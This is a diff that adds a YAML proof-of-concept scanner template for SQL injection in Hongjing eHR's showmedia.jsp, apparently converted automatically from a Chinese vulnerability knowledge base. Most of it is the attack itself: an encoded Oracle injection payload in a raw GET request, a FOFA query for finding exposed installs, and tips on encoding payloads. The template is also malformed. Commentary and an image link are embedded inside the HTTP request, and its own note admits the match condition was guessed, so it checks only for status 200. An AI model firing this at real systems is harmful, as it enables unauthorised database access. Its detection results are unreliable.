@@ -1,0 +1,36 @@
+id: poc-btt496zqsgr72hbb
+info:
+  name: 宏景eHR showmedia.jsp SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/btt496zqsgr72hbb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: btt496zqsgr72hbb
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /train/resource/course/showmedia.jsp?a_code&r5100=RzvoYYlxoMjNIPAATTP2HJBPAATTPGGqY4XJPloJ5D5mnYCLzn1uPAATTP2HJBPAATTPQPnPAATTP2HJBPAATTPXdzNJ8pj7I9Y5s1xDAUfUx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64MHhzZWM=) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive
+
+
+    payload为Oracle注入语句，需使用 HrmsTool.jar 编码，可自行根据环境构造payload
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717035900235-69ba3ef9-e6ac-42b5-8d63-f34837fe0aa0.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
